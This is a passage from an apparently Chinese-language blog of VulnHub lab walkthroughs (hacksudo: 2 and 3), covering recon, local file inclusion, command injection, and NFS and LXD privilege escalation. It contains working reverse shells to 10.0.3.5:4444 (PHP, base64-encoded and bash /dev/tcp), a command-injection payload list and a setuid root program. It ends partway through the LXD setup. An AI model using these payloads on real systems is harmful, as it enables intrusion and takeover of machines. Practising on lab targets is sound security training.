<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-01 11:32 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.0.3.6 (10.0.3.6)</span><br><span class="line">Host is up (0.0015s latency).</span><br><span class="line">Not shown: 65527 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE  VERSION</span><br><span class="line">80/tcp    open  http     Apache httpd 2.4.46 ((Ubuntu))</span><br><span class="line">|_http-title: hacksudo:2</span><br><span class="line">|_http-server-header: Apache/2.4.46 (Ubuntu)</span><br><span class="line">111/tcp   open  rpcbind  2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  3,4          111/tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111/udp6  rpcbind</span><br><span class="line">|   100003  3           2049/udp   nfs</span><br><span class="line">|   100003  3           2049/udp6  nfs</span><br><span class="line">|   100003  3,4         2049/tcp   nfs</span><br><span class="line">|   100003  3,4         2049/tcp6  nfs</span><br><span class="line">|   100005  1,2,3      38677/tcp   mountd</span><br><span class="line">|   100005  1,2,3      54046/udp6  mountd</span><br><span class="line">|   100005  1,2,3      55239/udp   mountd</span><br><span class="line">|   100005  1,2,3      57721/tcp6  mountd</span><br><span class="line">|   100021  1,3,4      32959/tcp   nlockmgr</span><br><span class="line">|   100021  1,3,4      38629/tcp6  nlockmgr</span><br><span class="line">|   100021  1,3,4      40313/udp6  nlockmgr</span><br><span class="line">|   100021  1,3,4      56487/udp   nlockmgr</span><br><span class="line">|   100227  3           2049/tcp   nfs_acl</span><br><span class="line">|   100227  3           2049/tcp6  nfs_acl</span><br><span class="line">|   100227  3           2049/udp   nfs_acl</span><br><span class="line">|_  100227  3           2049/udp6  nfs_acl</span><br><span class="line">1337/tcp  open  ssh      OpenSSH 8.3p1 Ubuntu 1ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 52:2e:98:98:b9:e9:c0:92:ed:ac:f8:8c:ee:3c:2e:dc (RSA)</span><br><span class="line">|   256 6b:bb:8c:90:71:6a:f9:e8:2a:12:8f:0a:78:2b:26:7d (ECDSA)</span><br><span class="line">|_  256 13:68:45:ff:32:68:0c:e4:b5:1e:9b:ae:b6:33:f3:be (ED25519)</span><br><span class="line">2049/tcp  open  nfs      3-4 (RPC <span class="comment">#100003)</span></span><br><span class="line">32959/tcp open  nlockmgr 1-4 (RPC <span class="comment">#100021)</span></span><br><span class="line">38677/tcp open  mountd   1-3 (RPC <span class="comment">#100005)</span></span><br><span class="line">59045/tcp open  mountd   1-3 (RPC <span class="comment">#100005)</span></span><br><span class="line">59637/tcp open  mountd   1-3 (RPC <span class="comment">#100005)</span></span><br><span class="line">MAC Address: 08:00:27:F6:FF:EC (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 5.0 - 5.5</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   1.51 ms 10.0.3.6 (10.0.3.6)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 38.07 seconds</span><br></pre></td></tr></table></figure>
<h3 id="web-信息收集">1.3. Web 信息收集</h3>
<p>扫目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u <span class="string">&quot;http://10.0.3.6/&quot;</span> -w /usr/share/wordlists/dirb/common.txt -e php,txt,html -t 5 -f</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Target: http://10.0.3.6/</span><br><span class="line"></span><br><span class="line">[11:36:05] Starting: </span><br><span class="line">[11:36:18] 301 -  304B  - /audio  -&gt;  http://10.0.3.6/audio/                </span><br><span class="line">[11:36:20] 200 -  559B  - /audio/                                           </span><br><span class="line">[11:36:39] 301 -  302B  - /css  -&gt;  http://10.0.3.6/css/                    </span><br><span class="line">[11:36:39] 200 -  451B  - /css/                                             </span><br><span class="line">[11:36:59] 200 -  180B  - /file.php                                         </span><br><span class="line">[11:37:05] 200 -   10KB - /game.html                                        </span><br><span class="line">[11:37:15] 403 -  273B  - /icons/                                           </span><br><span class="line">[11:37:20] 200 -   24KB - /info.php                                         </span><br><span class="line">[11:37:29] 301 -  302B  - /lib  -&gt;  http://10.0.3.6/lib/                    </span><br><span class="line">[11:37:29] 200 -  612B  - /lib/                                             </span><br><span class="line">[11:38:32] 403 -  273B  - /server-status                                    </span><br><span class="line">[11:38:32] 403 -  273B  - /server-status/</span><br><span class="line">[11:38:50] 200 -    1KB - /test.html                                        </span><br><span class="line">[11:38:50] 200 -  502B  - /test123.html                                     </span><br><span class="line">[11:38:52] 301 -  304B  - /tiles  -&gt;  http://10.0.3.6/tiles/                </span><br><span class="line">[11:38:52] 200 -  450B  - /tiles/</span><br><span class="line">[11:39:06] 301 -  302B  - /web  -&gt;  http://10.0.3.6/web/                    </span><br><span class="line">[11:39:06] 200 -  455B  - /web/                                             </span><br><span class="line">                                                                             </span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure>
<p>/file.php 可能存在文件包含漏洞，FUZZ 下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wfuzz -c -Z -u 10.0.3.6/file.php?FUZZ=/etc/passwd -w /usr/share/wordlists/wfuzz/general/common.txt --hw 14</span><br></pre></td></tr></table></figure>
<p>找到个file 参数，读取下file.php</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">……file=php://filter/read=convert.base64-encode/resource=file.php</span><br><span class="line">=&gt;</span><br><span class="line">PGh0bWw+CjxoZWFkPjx0aXRsZT5oYWNrc3VkbyBmaWxlIGFjY2VzczwvdGl0bGU+PC9oZWFkPgo8Ym9keSBzdHlsZT0iYmFja2dyb3VuZC1jb2xvcjpwb3dkZXJibHVlOyI+Cjw/cGhwCiAgICRmaWxlID0gJF9HRVRbJ2ZpbGUnXTsKICAgaWYoaXNzZXQoJGZpbGUpKQogICB7CiAgICAgICBpbmNsdWRlKCIkZmlsZSIpOwogICB9CiAgIGVsc2UKICAgewogICAgICAgaW5jbHVkZSgiaW5kZXgucGhwIik7CiAgIH0KICAgPz4KPGgxPjxtYXJxdWVlPmhhY2tzdWRvIEZJTGUgYWNjZXNzPC9tYXJxdWVlPjwvaDE+Cjxicj48Y2VudGVyPjxhIGhyZWY9Imh0dHBzOi8vaGFja3N1ZG8uY29tIj5oYWNrc3VkbyBXRUJTSVRFPC9hPjwvY2VudGVyPgo8L2JvZHk+CjwvaHRtbD4K</span><br><span class="line">=&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;<span class="built_in">head</span>&gt;&lt;title&gt;hacksudo file access&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body style=<span class="string">&quot;background-color:powderblue;&quot;</span>&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">   <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">   <span class="keyword">if</span>(isset(<span class="variable">$file</span>))</span><br><span class="line">   &#123;</span><br><span class="line">       include(<span class="string">&quot;<span class="variable">$file</span>&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">       include(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   ?&gt;</span><br><span class="line">&lt;h1&gt;&lt;marquee&gt;hacksudo FILe access&lt;/marquee&gt;&lt;/h1&gt;</span><br><span class="line">&lt;br&gt;&lt;center&gt;&lt;a href=<span class="string">&quot;https://hacksudo.com&quot;</span>&gt;hacksudo WEBSITE&lt;/a&gt;&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>尝试进一步利用文件包含漏洞 【<a
href="https://zhuanlan.zhihu.com/p/371065742">文件包含漏洞GetShell利用方法丨漏洞银行技术分享
- 知乎</a>】，均未成功，读取 ssh 日志也未成功！暂存看看其他的</p>
<p>端口扫描发现靶机开了 nfs【<a
href="https://zhuanlan.zhihu.com/p/554370248">NFS服务详解 - 知乎</a>】
，简言之：通过使用NFS协议，客户机可以像访问本地目录一样访问远程服务器中的共享资源</p>
<p>查看服务端的共享目录及网段</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">showmount -e 10.0.3.6  </span><br><span class="line">…………  </span><br><span class="line">Export list <span class="keyword">for</span> 10.0.3.6:  </span><br><span class="line">/mnt/nfs *  </span><br></pre></td></tr></table></figure>
<p>对访问没有做限制，直接将共享目录挂载到本地</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mount -t nfs 10.0.3.6:/mnt/nfs  </span><br><span class="line">……  </span><br><span class="line">Filesystem         Size  Used Avail Use% Mounted on</span><br><span class="line">udev               1.9G     0  1.9G   0% /dev</span><br><span class="line">tmpfs              393M 1012K  392M   1% /run</span><br><span class="line">/dev/sda1           79G   14G   61G  19% /</span><br><span class="line">tmpfs              2.0G     0  2.0G   0% /dev/shm</span><br><span class="line">tmpfs              5.0M     0  5.0M   0% /run/lock</span><br><span class="line">tmpfs              393M  120K  393M   1% /run/user/0</span><br><span class="line">10.0.3.6:/mnt/nfs   16G  5.2G  9.6G  35% /mnt  </span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404021010018.png" /></p>
<p>读到 flag1.txt</p>
<h2 id="渗透攻击">2. 渗透攻击</h2>
<h3 id="获取-shell">2.1. 获取 shell</h3>
<p>结合文件包含漏洞写个反弹 shell</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">echo</span> shell_working; </span><br><span class="line">  <span class="title function_ invoke__">system</span>(<span class="string">&#x27;php -r \&#x27;$sock=fsockopen(&quot;10.0.3.5&quot;,&quot;4444&quot;);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);\&#x27;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>http://10.0.3.6/file.php?file=/mnt/nfs/reshell.php</code></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404021050555.png" /></p>
<h3 id="提权">2.2. 提权</h3>
<p>常规命令没找到可提权信息，尝试用 nfs 提权</p>
<p>当服务器中存在NFS共享，且开启了no_root_squash选项时，这时如果客户端使用的是root用户，那么对于共享目录来说，该客户端就有root权限，可以使用它来提升权限。</p>
<p>①查看NFS服务器上的共享目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo showmount -e x.x.x.x</span><br></pre></td></tr></table></figure>
<p>②创建本地挂载目录，挂载共享目录。使用攻击者本地root权限创建Suid
shell。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">mkdir</span> -p /tmp</span><br><span class="line">sudo mount -t nfs x.x.x.x:/home/test /tmp</span><br><span class="line"><span class="built_in">cp</span> /bin/bash /tmp/shell</span><br><span class="line"><span class="built_in">chmod</span> +xs /tmp/shell</span><br></pre></td></tr></table></figure>
<p>③回到要提权的服务器上，使用普通用户使用 <code>./shell -p</code>
来获取root权限。</p>
<p>注， kali 的 <code>/bin/bash</code> 版本可能会过高</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404021223815.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404021223816.png" /></p>
<p>找个低版本的传过去提权</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404021231888.png" /></p>
<p>成功！</p>
<p>按这个方法【<a
href="https://cloud.tencent.com/developer/article/1708369">Linux提权姿势二：利用NFS提权-腾讯云开发者社区-腾讯云</a>】也可</p>
<p>sudo_root_exp.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span> </span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123; setuid(<span class="number">0</span>); system(<span class="string">&quot;/bin/bash&quot;</span>); <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br></pre></td></tr></table></figure>
<p>本地用<strong>低版本</strong> gcc 编译好直接传上去，经测
<code>gcc version 10.3.0 (Ubuntu 10.3.0-1ubuntu1~20.10)</code> 可行</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404021236658.png" /></p>
<p>成功！</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Vulnhub 靶场</tag>
        <tag>信息收集</tag>
        <tag>提权</tag>
        <tag>反弹 shell</tag>
      </tags>
  </entry>
  <entry>
    <title>hacksudo: 3</title>
    <url>/2024/04/02/hacksudo%203/</url>
    <content><![CDATA[<blockquote>
<p>靶机：<a
href="https://www.vulnhub.com/entry/hacksudo-3,671/">hacksudo: 3 ~
VulnHub</a></p>
</blockquote>
<h2 id="信息收集">1. 信息收集</h2>
<h3 id="主机探测">1.1. 主机探测</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netdiscover  -r 10.0.3.0/24</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Currently scanning: Finished!   |   Screen View: Unique Hosts                        </span><br><span class="line">4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240      </span><br><span class="line"> _____________________________________________________________________________</span><br><span class="line">   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      </span><br><span class="line"> -----------------------------------------------------------------------------</span><br><span class="line"> 10.0.3.1        52:54:00:12:35:00      1      60  Unknown vendor            </span><br><span class="line"> 10.0.3.2        52:54:00:12:35:00      1      60  Unknown vendor      </span><br><span class="line"> 10.0.3.3        08:00:27:1f:8e:5f      1      60  PCS Systemtechnik GmbH        </span><br><span class="line"> 10.0.3.7        08:00:27:c0:<span class="built_in">df</span>:39      1      60  PCS Systemtechnik GmbH </span><br></pre></td></tr></table></figure>
<p>靶机：10.0.3.7</p>
<h3 id="端口扫描">1.2. 端口扫描</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -A 10.0.3.7 -p1-65535</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-02 01:40 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.0.3.7 (10.0.3.7)</span><br><span class="line">Host is up (0.0018s latency).</span><br><span class="line">Not shown: 65532 closed tcp ports (reset)</span><br><span class="line">PORT   STATE    SERVICE VERSION</span><br><span class="line">21/tcp filtered ftp</span><br><span class="line">22/tcp filtered ssh</span><br><span class="line">80/tcp open     http    Apache httpd 2.4.46 ((Ubuntu))</span><br><span class="line">|_http-title: Link Lock - Password-protect links</span><br><span class="line">|_http-server-header: Apache/2.4.46 (Ubuntu)</span><br><span class="line">MAC Address: 08:00:27:C0:DF:39 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 4.X|5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 4.15 - 5.8</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   1.83 ms 10.0.3.7 (10.0.3.7)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 37.37 seconds</span><br></pre></td></tr></table></figure>
<h3 id="web-信息收集">1.3. Web 信息收集</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u <span class="string">&quot;http://10.0.3.7&quot;</span> -w /usr/share/wordlists/dirb/common.txt -e php,txt,html -t 5 -f</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Target: http://10.0.3.7/</span><br><span class="line"></span><br><span class="line">[01:45:18] Starting: </span><br><span class="line">[01:45:43] 301 -  305B  - /create  -&gt;  http://10.0.3.7/create/              </span><br><span class="line">[01:45:43] 200 -    5KB - /create/</span><br><span class="line">[01:45:46] 301 -  306B  - /decrypt  -&gt;  http://10.0.3.7/decrypt/            </span><br><span class="line">[01:45:46] 200 -    2KB - /decrypt/                                         </span><br><span class="line">[01:45:59] 200 -    4KB - /favicon.ico                                      </span><br><span class="line">[01:46:05] 200 -  410B  - /generator.php                                    </span><br><span class="line">[01:46:10] 200 -    3KB - /hidden/                                          </span><br><span class="line">[01:46:10] 301 -  305B  - /hidden  -&gt;  http://10.0.3.7/hidden/</span><br><span class="line">[01:46:13] 403 -  273B  - /icons/                                           </span><br><span class="line">[01:46:16] 200 -   23KB - /info.php                                         </span><br><span class="line">[01:46:25] 200 -    1KB - /LICENSE                                          </span><br><span class="line">[01:46:27] 200 -  283B  - /login.php                                        </span><br><span class="line">[01:47:24] 403 -  273B  - /server-status/                                   </span><br><span class="line">[01:47:24] 403 -  273B  - /server-status</span><br><span class="line">                                                                             </span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure>
<p>/login.php 尝试爆破和注入未果，/generator.php 可能存在 RCE，FUZZ
下</p>
<p>字典 Unix-Commond-Inject-Payload-List.txt【<a
href="https://github.com/TheKingOfDuck/fuzzDicts">GitHub -
TheKingOfDuck/fuzzDicts: Web Pentesting Fuzz 字典,一个就够了。</a>】</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">id</span></span><br><span class="line">,<span class="built_in">id</span></span><br><span class="line">;<span class="built_in">id</span></span><br><span class="line">;<span class="built_in">id</span>;</span><br><span class="line"><span class="string">&#x27;id&#x27;</span></span><br><span class="line"><span class="string">&quot;id&quot;</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span><span class="built_in">id</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span><span class="built_in">id</span><span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span><span class="built_in">id</span><span class="string">&#x27;&#x27;</span>&amp;</span><br><span class="line">*<span class="built_in">id</span></span><br><span class="line">*<span class="built_in">id</span>*</span><br><span class="line">**<span class="built_in">id</span>**</span><br><span class="line">(<span class="built_in">id</span>)</span><br><span class="line">`<span class="built_in">id</span>`</span><br><span class="line">`<span class="built_in">id</span>`&amp;</span><br><span class="line">`<span class="built_in">id</span>` &amp;</span><br><span class="line">;<span class="built_in">id</span>|</span><br><span class="line">;|<span class="built_in">id</span>|</span><br><span class="line">|<span class="built_in">id</span></span><br><span class="line">|<span class="built_in">id</span>|</span><br><span class="line">||<span class="built_in">id</span></span><br><span class="line">||<span class="built_in">id</span>|</span><br><span class="line">||<span class="built_in">id</span>;</span><br><span class="line">|<span class="built_in">id</span>;</span><br><span class="line">&amp;<span class="built_in">id</span></span><br><span class="line">&amp;<span class="built_in">id</span>&amp;</span><br><span class="line">&amp;&amp;<span class="built_in">id</span></span><br><span class="line">&amp;&amp;<span class="built_in">id</span>&amp;&amp;</span><br><span class="line">^<span class="built_in">id</span></span><br><span class="line">&lt;<span class="built_in">id</span></span><br><span class="line">\<span class="built_in">id</span></span><br><span class="line">);<span class="built_in">id</span></span><br><span class="line">&lt;<span class="built_in">id</span>;</span><br><span class="line">);<span class="built_in">id</span>;</span><br><span class="line">);<span class="built_in">id</span>|</span><br><span class="line">)|<span class="built_in">id</span></span><br><span class="line">)|<span class="built_in">id</span>;</span><br><span class="line">\<span class="built_in">id</span>;</span><br><span class="line">\<span class="built_in">id</span>|</span><br><span class="line">\<span class="built_in">id</span>\</span><br><span class="line">(<span class="built_in">id</span></span><br><span class="line">)<span class="built_in">id</span> </span><br><span class="line">/id </span><br><span class="line">-<span class="built_in">id</span></span><br><span class="line">:<span class="built_in">id</span></span><br><span class="line">.<span class="built_in">id</span></span><br><span class="line"><span class="string">&quot; id</span></span><br><span class="line"><span class="string">&#x27; id</span></span><br><span class="line"><span class="string">| id</span></span><br><span class="line"><span class="string">&amp; id</span></span><br><span class="line"><span class="string">, id</span></span><br><span class="line"><span class="string">; id</span></span><br><span class="line"><span class="string">&amp; id &amp;</span></span><br><span class="line"><span class="string">&amp;&amp; id</span></span><br><span class="line"><span class="string">|| id</span></span><br><span class="line"><span class="string">&#x27; `id`</span></span><br><span class="line"><span class="string">&quot;</span> `<span class="built_in">id</span>`</span><br><span class="line">, `<span class="built_in">id</span>`</span><br><span class="line">| `<span class="built_in">id</span>`</span><br><span class="line">&amp; `<span class="built_in">id</span>`</span><br><span class="line">; `<span class="built_in">id</span>`</span><br><span class="line"><span class="string">&#x27; `id` #</span></span><br><span class="line"><span class="string">&quot; `id` #</span></span><br><span class="line"><span class="string">, `id` #</span></span><br><span class="line"><span class="string">| `id` #</span></span><br><span class="line"><span class="string">; `id` #</span></span><br><span class="line"><span class="string">;id/n</span></span><br><span class="line"><span class="string">&lt;id\n</span></span><br><span class="line"><span class="string">\nid</span></span><br><span class="line"><span class="string">\nid\n</span></span><br><span class="line"><span class="string">a;id</span></span><br><span class="line"><span class="string">a);id</span></span><br><span class="line"><span class="string">a;id;</span></span><br><span class="line"><span class="string">a);id|</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wfuzz -c -Z  -u http://10.0.3.7/generator.php -d <span class="string">&quot;ip=FUZZ&amp;submit=submit&quot;</span> -w Unix-Commond-Inject-Payload-List.txt --zE urlencode --ss uid=  </span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line">wfuzz -c -Z  -u http://10.0.3.7/generator.php -d <span class="string">&quot;ip=FUZZ&amp;submit=submit&quot;</span> -z file,Unix-Commond-Inject-Payload-List.txt,urlencode --ss uid=</span><br></pre></td></tr></table></figure>
<p>注，由于是 post 方法，所以要编码下，wfuzz 具体教程可参见 <a
href="https://wfuzz.readthedocs.io/en/latest/">Wfuzz: The Web fuzzer —
Wfuzz 2.1.4 documentation</a></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404021523907.png" /></p>
<p>存在 RCE【<code>%26是&amp;</code>】</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404021526476.png" /></p>
<h2 id="渗透攻击">2. 渗透攻击</h2>
<h3 id="获取-shell">2.1. 获取 shell</h3>
<p>尝试反弹 shell</p>
<p>经测服务端对 <code>;</code> <code>|</code>
做了过滤，直接写行不通，所以利用 base64 编码绕过下</p>
<p>reshell.php</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">  <span class="built_in">echo</span> shell_working; </span><br><span class="line">  system(<span class="string">&#x27;php -r \&#x27;</span><span class="variable">$sock</span>=fsockopen(<span class="string">&quot;10.0.3.5&quot;</span>,<span class="string">&quot;4444&quot;</span>);<span class="built_in">exec</span>(<span class="string">&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);\&#x27;<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">  ?&gt;</span></span><br></pre></td></tr></table></figure>
<p>base64 编码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PD9waHAgCiAgZWNobyBzaGVsbF93b3JraW5nOyAKICBzeXN0ZW0oJ3BocCAtciBcJyRzb2NrPWZzb2Nrb3BlbigiMTAuMC4zLjUiLCI0NDQ0Iik7ZXhlYygiL2Jpbi9iYXNoIC1pIDwmMyA+JjMgMj4mMyIpO1wnJyk7CiAgPz4=</span><br></pre></td></tr></table></figure>
<p>命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;&amp; echo &quot;PD9waHAgCiAgZWNobyBzaGVsbF93b3JraW5nOyAKICBzeXN0ZW0oJ3BocCAtciBcJyRzb2NrPWZzb2Nrb3BlbigiMTAuMC4zLjUiLCI0NDQ0Iik7ZXhlYygiL2Jpbi9iYXNoIC1pIDwmMyA+JjMgMj4mMyIpO1wnJyk7CiAgPz4=&quot; &gt; test.txt</span><br><span class="line"></span><br><span class="line">&amp;&amp; base64 -d test.txt &gt; shell.php</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404021648923.png" /></p>
<p>经测下面命令也可实现</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&amp;&amp; `bash -c <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/10.0.3.5/4444 0&gt;&amp;1&quot;</span>`</span><br></pre></td></tr></table></figure>
<h3 id="提权">2.2. 提权</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -writable 2&gt;/dev/null | grep -v /proc</span><br></pre></td></tr></table></figure>
<p>找到个 <code>/var/www/hacksudo</code> 文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">unpxfhqb ybpxre FFU hfreanzr:unpxfhqb cnffjbeq:63p9142792q571q0s7p28ro30626q6s38792n2r7679o76q784231676q62447so80ns8953745s709p6622qqn2po4q754p262q0q31o3030n08s7o524079n6o336o</span><br></pre></td></tr></table></figure>
<p>凯撒枚举</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404021735068.png" /></p>
<p>得</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hacksudo locker SSH username:hacksudo password:63c9142792d571d0f7c28eb30626d6f38792a2e7679b76d784231676d62447fb80af8953745f709c6622dda2cb4d754c262d0d31b3030a08f7b524079a6b336b</span><br></pre></td></tr></table></figure>
<p>破解密码 <a
href="https://www.cmd5.com/default.aspx">md5在线解密破解,md5解密加密</a>
得 vishal，即 hacksudo/vishal</p>
<p>当前 shell 切换用户</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404021739026.png" /></p>
<p>lxd 提权可参见：<a
href="https://www.cnblogs.com/jhinjax/p/17078938.html">lxd组的提权方法 -
野荷 - 博客园</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hacksudo@hacksudo:~$ <span class="built_in">id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=1000(hacksudo) gid=1000(hacksudo) <span class="built_in">groups</span>=1000(hacksudo),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)</span><br><span class="line">hacksudo@hacksudo:~$ wget http://10.0.3.5:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz</span><br><span class="line">&lt;0.3.5:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz</span><br><span class="line">--2024-04-02 10:12:17--  http://10.0.3.5:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz</span><br><span class="line">Connecting to 10.0.3.5:8000... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 3259593 (3.1M) [application/gzip]</span><br><span class="line">Saving to: ‘alpine-v3.13-x86_64-20210218_0139.tar.gz’</span><br><span class="line"></span><br><span class="line">alpine-v3.13-x86_64 100%[===================&gt;]   3.11M  --.-KB/s    <span class="keyword">in</span> 0.08s   </span><br><span class="line"></span><br><span class="line">2024-04-02 10:12:17 (41.2 MB/s) - ‘alpine-v3.13-x86_64-20210218_0139.tar.gz’ saved [3259593/3259593]</span><br><span class="line"></span><br><span class="line">hacksudo@hacksudo:~$ lxd init</span><br><span class="line">lxd init</span><br><span class="line">Would you like to use LXD clustering? (<span class="built_in">yes</span>/no) [default=no]: </span><br><span class="line"></span><br><span class="line">Do you want to configure a new storage pool? (<span class="built_in">yes</span>/no) [default=<span class="built_in">yes</span>]: </span><br><span class="line"></span><br><span class="line">Name of the new storage pool [default=default]: </span><br><span class="line"></span><br><span class="line">Name of the storage backend to use (btrfs, ceph, <span class="built_in">dir</span>, lvm, zfs) [default=zfs]: </span><br><span class="line"></span><br><span class="line">Create a new ZFS pool? (<span class="built_in">yes</span>/no) [default=<span class="built_in">yes</span>]: </span><br><span class="line"></span><br><span class="line">Would you like to use an existing empty block device (e.g. a disk or partition)? (<span class="built_in">yes</span>/no) [default=no]: </span><br><span class="line"></span><br><span class="line">Size <span class="keyword">in</span> GiB of the new loop device (1GiB minimum) [default=5GiB]: </span><br><span 